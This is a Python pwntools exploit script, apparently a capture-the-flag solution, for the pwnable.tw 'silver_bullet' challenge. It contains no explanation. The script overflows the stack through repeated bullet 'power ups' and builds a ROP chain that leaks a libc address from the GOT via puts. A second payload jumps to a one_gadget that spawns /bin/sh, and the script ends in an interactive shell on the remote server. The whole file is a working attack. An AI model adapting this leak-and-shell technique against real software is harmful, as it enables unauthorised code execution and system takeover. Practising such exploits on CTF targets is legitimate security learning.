from pwn import *
context.log_level="debug"
elf=ELF("./silver_bullet")
libc=ELF("./bc.so.6")
# conn=process("./silver_bullet")
conn=remote("chall.pwnable.tw",10103)

def create_bullet(payload):
	conn.sendlineafter("Your choice :","1")
	conn.sendlineafter("Give me your description of bullet :",payload)
	conn.recvuntil("Good luck !!\n")

def power_up(payload):
	conn.sendlineafter("Your choice :","2")
	conn.sendlineafter("Give me your another description of bullet :",payload)
	conn.recvuntil("Enjoy it !\n")

def beat():
	conn.sendlineafter("Your choice :","3")
	conn.recvuntil("Try to beat it .....\n")
	conn.recvline()

# get libc address
create_bullet("a"*47)
power_up("a")
payload="\xff"*7+p32(elf.symbols["puts"])+p32(elf.symbols["main"])+p32(elf.got["read"])
power_up(payload)
beat()
# jmp to main
libc_add=u32(conn.recvline()[:4])-libc.symbols["read"]
create_bullet("a"*47)
power_up("a")
payload="\xff"*7+p32(libc_add+0x5f065)
power_up(payload)
beat()
conn.interactive()


# one_gadget libc
# 0x5f065	execl("/bin/sh", eax)
# constraints:
#   esi is the GOT address of libc
#   eax == NULL
